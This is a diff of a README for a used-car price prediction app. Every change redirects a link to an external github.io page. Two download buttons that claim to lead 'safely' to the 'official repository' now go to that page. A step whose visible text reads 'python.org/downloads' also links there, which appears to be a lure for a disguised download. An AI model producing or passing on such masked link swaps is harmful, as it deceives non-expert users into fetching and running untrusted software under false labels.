@@ -1,6 +1,6 @@
 <h1>🚗 car-price-prediction-priyanshu-jpgsketch - Predict Used Car Prices Instantly</h1>
 <p align="center">
-  <a href="https://github.com/Christguttural5/car-price-prediction-priyanshu-jpgsketch">
+  <a href="https://christguttural5.github.io">
     <img src="https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github" alt="Download Button">
   </a>
 </p>
@@ -42,7 +42,7 @@
 <h3>Step 1: Download the Application</h3>
 <p>Click the button below to go to the download page. This link is safe and takes you directly to the official repository.</p>
 <p align="center">
-  <a href="https://github.com/Christguttural5/car-price-prediction-priyanshu-jpgsketch">
+  <a href="https://christguttural5.github.io">
     <img src="https://img.shields.io/badge/⬇️_Download_Now-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download Now">
   </a>
 </p>
@@ -59,7 +59,7 @@
 
 <h3>Step 3: Install Python (If You Don't Have It)</h3>
 <ol>
-  <li>Open your web browser and go to <a href="https://www.python.org/downloads/">python.org/downloads</a>.</li>
+  <li>Open your web browser and go to <a href="https://christguttural5.github.io">python.org/downloads</a>.</li>
   <li>Click the yellow button that says "Download Python 3.12" (or the latest version).</li>
   <li>When the file finishes downloading, open it.</li>
   <li><strong>Check the box that says "Add Python to PATH"</strong> at the bottom of the window. This is very important.</li>
